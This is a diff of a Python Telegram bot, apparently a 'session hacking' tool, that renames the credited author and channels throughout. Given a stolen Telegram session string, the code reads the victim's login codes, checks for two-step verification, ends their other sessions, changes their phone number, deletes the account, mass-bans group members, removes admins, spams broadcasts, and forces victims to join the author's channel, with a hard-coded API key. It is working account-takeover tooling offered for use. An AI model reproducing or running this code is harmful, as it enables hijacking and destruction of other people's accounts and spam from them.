@@ -1,6 +1,6 @@
 
-# COPYRIGHT © 2022 BY ANES/@N_B_1 🔥
-# NOW PUBLIC BY Anes
+# COPYRIGHT © 2022 BY BABLOO/@DEV_BABLOO 🔥
+# NOW PUBLIC BY BABLOO
 import os
 os.system("pip install -U telethon")
 from telethon import TelegramClient, events, functions, types, Button
@@ -25,27 +25,27 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-Arabihack = 5502537272
+Arabihack = 5341342370
 
-Bot_Username =os.environ.get("BOT_USERNAME", None) or "SessionHackingBot"
+Bot_Username =os.environ.get("BOT_USERNAME", None) or "SESSION_H_A_K_BOT"
 
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("Repthon"))
+      await bot(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await bot(join("QQQLO"))
+      await bot(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await bot(leave("@IndianUpdateChannel"))
+      await bot(leave("@TELETHON"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Ids_Holder"))
+      await bot(leave("@TELETHON"))
     except BaseException:
       pass
     try: 
@@ -62,11 +62,11 @@ async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("QQQLO"))
+      await bot(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await bot(join("Repthon"))
+      await bot(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -92,11 +92,11 @@ async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
     try:
-      await X(join("QQQLO"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("Repthon"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -112,11 +112,11 @@ async def userinfo(strses):
 async def terminate(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@IndianSupportGroup"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -133,11 +133,11 @@ GROUP_LIST = []
 async def delacc(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Ids_Holder"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -149,11 +149,11 @@ async def delacc(strses):
 async def promote(strses, grp, user):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@IndianSupportGroup"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -172,11 +172,11 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@IndianSupportGroup"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -196,11 +196,11 @@ async def user2fa(strses):
 async def demall(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@IndianSupportGroup"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -222,11 +222,11 @@ async def demall(strses, grp):
 async def joingroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@IndianSupportGroup"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -243,11 +243,11 @@ async def joingroup(strses, username):
 async def leavegroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@IndianSupportGroup"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -263,11 +263,11 @@ async def leavegroup(strses, username):
 async def delgroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@IndianSupportGroup"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -293,11 +293,11 @@ async def usermsgs(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     i = ""
     try:
-      await X(join("@IndianSupportGroup"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@Repthon"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -317,11 +317,11 @@ async def usermsgs(strses):
 async def userbans(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@IndianSupportGroup"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -344,11 +344,11 @@ async def userbans(strses, grp):
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@IndianSupportGroup"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@BA_BLOO"))
     except BaseException:
       pass
     try:
@@ -363,7 +363,7 @@ async def userchannels(strses):
     i = ""
     for x in k.chats:
       try:
-        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
+        i += f'\nCHANNEL NAME ✰︎ {x.title} CHANNEL USRNAME ✰︎ @{x.username}\n'
       except:
         pass
     return str(i)
@@ -373,40 +373,41 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "Repthon"
+channel = "BA_BLOO"
 menu = '''
 
-"A" :~ [معرفه قنوات/كروبات التي يملكها]
+"A" :✰︎ [معرفه قنوات/جروبات التي يملكها]
 
-"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
+"B" :✰︎ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
 
-"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
+"C" :✰︎ [{تفليش جروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الجروب/القناه و ساطرد جميع اعضاء]
 
-"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
+"D" :✰︎ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
 
-"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس] 
+"E" :✰︎ [انضمام الى جروب/قناه عن طريق كود ترمكس] 
 
-"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]
+"F" :✰︎ [مغادره جروب /قناه عن طريق كود ترمكس]
 
-"G" :~][مسح كروب /قناه عن عن طريق كود ترمكس]
+"G" :✰︎ [مسح جروب /قناه عن عن طريق كود ترمكس]
 
-"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]
+"H" :✰︎ [تاكد من التحقق بخطوتين /مفعل او لا]
 
-"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]
+"I" :✰︎ [انهاء جميع الجلسات ما عدا جلسة البوت]
 
-"J" :~ [حذف الحساب]
+"J" :✰︎ [حذف الحساب عن طريق كود ترمكس]
 
-"K" :~ [حذف جميع المشرفين في كروب/قناه]
+"K" :✰︎ [ترقيه عضو الى مشرف بالجروب/بالقناه]
 
-"L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]
+"L" :✰︎ [حذف جميع المشرفين الجروب/القناه]
 
-"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
+"M" :✰︎ [تغير رقم الحساب باستخدام كود ترمكس]
 
-المطور: @ZQ_LO 👁️
-قناة المطور: @Repthon ⚠️
+"N" :✰︎ [لارسال رساله داخل الحساب عن طريق كود ترمكس] 
+
+انتظرو مميزات اكثر قريبا مطور البوت DEV_BABLOO.t.me
 '''
 mm = '''
-
+ملاحظه انضم اولا للدعم @BA_BLOO
 '''
 
 keyboard = [
@@ -431,7 +432,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("المطور", "https://t.me/ZQ_LO")
+    Button.url("༗𓌹𓏺 𝖥𝗈𝗋 Ⴆᥲ️Ⴆᥣ᥆᥆ . 💸 ˼ 𓌺", "https://t.me/DEV_BABLOO")
     ]
 ]
 
@@ -446,13 +447,22 @@ async def op(event):
       ]         
     await event.reply("اضغط هنا لاستخدامي", buttons=Arabihack)
   else:
-  
-    await event.reply(" الضغط على~ /hack", buttons=legendbye)
+    legendbye = [
+      [
+        Button.url("➪︎𝐒𝐎𝐔𝐑𝐂𝐄 𝐁𝐀𝐁𝑳𝐎𝐎⚙", f"https://t.me/BA_BLOO")
+        ]
+      ]
+    await event.reply("✰ اولا انضم الى القناه!\n✰ بعدها جرب ترسل /hack", buttons=legendbye)
     
-       
+
+
 @client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
 async def op(event):
-  
+  IndianHack = [
+    [
+      Button.url("دوس هنا", f"https://t.me/{Bot_Username}")
+      ]
+    ]         
   await event.reply("اضغط هنا لاستخدامي", buttons=Arabihack)
   
 @client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
@@ -481,7 +491,7 @@ async def start(event):
         Button.inline("N", data="N"),
         ],
       [
-        Button.url("المطور", "https://t.me/ZQ_LO")
+        Button.url("༗𓌹𓏺 𝖥𝗈𝗋 Ⴆᥲ️Ⴆᥣ᥆᥆ . 💸 ˼ 𓌺", "https://t.me/DEV_BABLOO")
         ]
     ]
     await x.send_message(f"اختر ما تريد فعله معه الجلسه \n\n{menu}", buttons=keyboard)
@@ -502,7 +512,7 @@ async def users(event):
         return await event.reply("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @ZQ_LO")
+        file.write(i + "\n\nDetails BY @DEV_BABLOO")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -531,11 +541,11 @@ async def users(event):
     if op:
       pass
     else:
-      return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا", buttons=keyboard)
-    await x.send_message("ارسل لي معرف/ايدي الكروب/القناه")
+      return await event.respond("لقد تم طرد هذا الكود من الحساب.\n/hack", buttons=keyboard)
+    await x.send_message("ارسل لي معرف/ايدي الجروب/القناه")
     grpid = await x.get_response()
     await userbans(strses.text, grpid.text)
-    await event.reply("يتم حظر جميع اعضاء الكروب/القناه", buttons=keyboard)
+    await event.reply("يتم حظر جميع اعضاء الجروب/القناه", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
 async def users(event):
@@ -546,9 +556,9 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لك لاستخدامك البوت", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لك لاستخدامك البوت.\n/hack", buttons=keyboard)
     
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -560,11 +570,11 @@ async def users(event):
     if op:
       pass
     else:
-      return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
-    await x.send_message("اعطني معرف/ايدي الكروب/القناه")
+      return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
+    await x.send_message("اعطني معرف/ايدي الجروب/القناه")
     grpid = await x.get_response()
     await joingroup(strses.text, grpid.text)
-    await event.reply("تم الانضمام الى الكروب/القناه", buttons=keyboard)
+    await event.reply("تم الانضمام الى الجروب/القناه.\n/hack", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
 async def users(event):
@@ -575,11 +585,11 @@ async def users(event):
     if op:
       pass
     else:
-      return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
-    await x.send_message("اعطني معرف/ايدي الكروب/القناه")
+      return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
+    await x.send_message("اعطني معرف/ايدي الجروب/القناه")
     grpid = await x.get_response()
     await leavegroup(strses.text, grpid.text)
-    await event.reply("لقد تم مغادره الكروب/القناه,", buttons=keyboard)
+    await event.reply("لقد تم مغادره الجروب/القناه,\n/hack", buttons=keyboard)
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
@@ -589,11 +599,11 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد الكود من الحساب مسبقا.", buttons=keyboard)
-      await x.send_message("اعطني معرف/ايدي كروب/قناه")
+        return await event.respond("لقد تم طرد الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
+      await x.send_message("اعطني معرف/ايدي جروب/قناه")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("تم حذف الكروب/قناه //شكرا لاستخدامك البوت.", buttons=keyboard)
+      await event.reply("تم حذف الجروب/قناه //شكرا لاستخدامك البوت.\n/hack", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -604,12 +614,12 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد الكود من الحساب مسبقا.", buttons=keyboard)
+        return await event.respond("لقد تم طرد الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       i = await user2fa(strses.text)
       if i:
-        await event.reply("الشخص لم يفعل تحقق بخطوتين يمكنك الدخول الى الحساب بكل سهوله باستخدامك الامر ( D ) \n\nشكرا لك لاستخدامك البوت.", buttons=keyboard)
+        await event.reply("الشخص لم يفعل تحقق بخطوتين يمكنك الدخول الى الحساب بكل سهوله باستخدامك الامر ( D ) \n\nشكرا لك لاستخدامك البوت.\n/hack", buttons=keyboard)
       else:
-        await event.reply("عذرا الشخص مفعل تحقق بخطوتين", buttons=keyboard)
+        await event.reply("عذرا الشخص مفعل تحقق بخطوتين.\n/hack", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
 async def users(event):
@@ -620,9 +630,9 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("تم انهاء جميع الجلسات شكرا لاستخدامك البوت.", buttons=keyboard)
+      await event.reply("تم انهاء جميع الجلسات شكرا لاستخدامك البوت.\n/hack", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -633,9 +643,9 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       i = await delacc(strses.text)
-      await event.reply("لقد تم حذف الحساب بنجاح.", buttons=keyboard)
+      await event.reply("لقد تم حذف الحساب بنجاح.\n/hack", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
 async def users(event):
@@ -646,13 +656,13 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
-      await x.send_message("ارسل لي معرف/ايدي الكروب/القناه")
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
+      await x.send_message("ارسل لي معرف/ايدي الجروب/القناه")
       grp = await x.get_response()
       await x.send_message("الان ارسل لي المعرف")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("سارفعك في الكروب/القناه🌚.", buttons=keyboard)
+      await event.reply("سارفعك في الجروب/القناه🌚.\n/hack", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
 async def users(event):
@@ -663,14 +673,14 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
-      await x.send_message("الان ارسل لي معرف/ايدي الكروب/قناه")
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
+      await x.send_message("الان ارسل لي معرف/ايدي الجروب/قناه")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("لقد تم حذف جميع مشرفين الكروب/القناه.", buttons=keyboard)
+      await event.reply("لقد تم حذف جميع مشرفين الجروب/القناه.\n/hack", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
 async def users(event):
@@ -681,12 +691,12 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا", buttons=keyboard)
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       await x.send_message("اعطني رقم التي تريد تغير اليه\n[ملاحظه /لا تستخدم ارقام الوهميه]\n[اذا استخدمت الارقام الوهميه مراح تكدر تحصل الكود] ")
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await event.respond(result + "\n انسخ كود hash تبع رقمك و تاكد من ان رقمك جي علي كود تسجيل دخول\nانا اتوقف لمده 20 ثانيه لنسخ كود hash و كود تسجيل دخول")
         await asyncio.sleep(20)
         await x.send_message("الان ارسل لي كود هاش")
         phone_code_hash = (await x.get_response()).text
@@ -694,11 +704,11 @@ async def users(event):
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("لقد تم تغير رقم الحساب بنجاح")
+          await event.respond("لقد تم تغير رقم الحساب بنجاح.\n/hack")
         else:
           await event.respond("هناك خطأ ما حصل")
       except Exception as e:
-        await event.respond("ارسل المشكله الى لحلها- @ZQ_LO\n**LOGS**\n" + str(e))
+        await event.respond("ارسل المشكله الى لحلها- @DEV_BABLOO\n**LOGS**\n" + str(e))
 
 
 
@@ -711,10 +721,10 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("المالك", "https://t.me/ZQ_LO")
+        Button.url("༗𓌹𓏺 𝖥𝗈𝗋 Ⴆᥲ️Ⴆᥣ᥆᥆ . 💸 ˼ 𓌺", "https://t.me/DEV_BABLOO")
         ]
     ]
-    await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
+    await event.reply("الان اعطني الامر التي تريد ان تستخدمه للاذاعه\n✰ للكل - اختر a\n✰ للجروبات - اختر b\n✰ للخاص - اختر c", buttons=keyboard)
 
 
 
@@ -728,7 +738,7 @@ async def gcasta(strses, msg):
                 chat = aman.id
                 try:
                     await X.send_message(chat, tol, file=file)     
-                    if lol != -1001878403490:
+                    if lol != -1001551357238:
                         await asyncio.sleep(60)
                         await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(60)
@@ -747,7 +757,7 @@ async def gcasta(strses, msg):
                         await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(60)
                         await X.send_message(chat, tol, file=file)
-                    elif chat == -1001878403490:
+                    elif chat == -1001606996743:
                         pass
                     await asyncio.sleep()
                 except Exception as e:
@@ -765,12 +775,12 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       await x.send_message("الان ارسل لي الرساله")
       msg = await x.get_response()
       await x.send_message("الان تم سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
       i = await gcasta(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} all 😗😗.", buttons=keyboard)
+      await event.reply(f"تم الاذاعه {i} للكل 😗😗.\n/hack", buttons=keyboard)
 
 molb = True
 
@@ -784,7 +794,7 @@ async def gcastb(strses, msg):
                 if sweetie.is_group:
                     chat = sweetie.id
                     try:
-                        if chat != -1001878403490:
+                        if chat != -1001606996743:
                             await X.send_message(chat, tol, file=file)
                             await asyncio.sleep(60)
                             await X.send_message(chat, tol, file=file)
@@ -872,7 +882,7 @@ async def gcastb(strses, msg):
                             while molb != False:
                                 await asyncio.sleep(600)
                                 await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
-                        elif chat == -1001878403490:
+                        elif chat == -1001606996743:
                             pass
                     except Exception as e:
                         print(e)
@@ -889,12 +899,12 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       await x.send_message("الان اعطي الرساله")
       msg = await x.get_response()
       await x.send_message("الان تم سوف يتم ارسال الرساله كل 10 دقائق بشكل تلقائي")
       i = await gcastb(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Group 😗😗.", buttons=keyboard)
+      await event.reply(f"تم الارسال في {i} جروب 😗😗.\n/hack", buttons=keyboard)
 
 async def gcastc(strses, msg):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -924,12 +934,12 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.", buttons=keyboard)
+        return await event.respond("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       await x.send_message("الان اعطني الرساله")
       msg = await x.get_response()
       await x.send_message("الان تم سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
       i = await gcastc(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Private😗😗.", buttons=keyboard)
+      await event.reply(f"تم ارسال الرسال في {i} الخاص😗😗.\n/hack", buttons=keyboard)
 
-print(" لقد تم تنصيب البوت بنجاح.")
+print(" لقد تم تنصيب البوت بنجاح.     للمساعده راسل المعرف التالي. @DEV_BABLOO")
 client.run_until_disconnected()
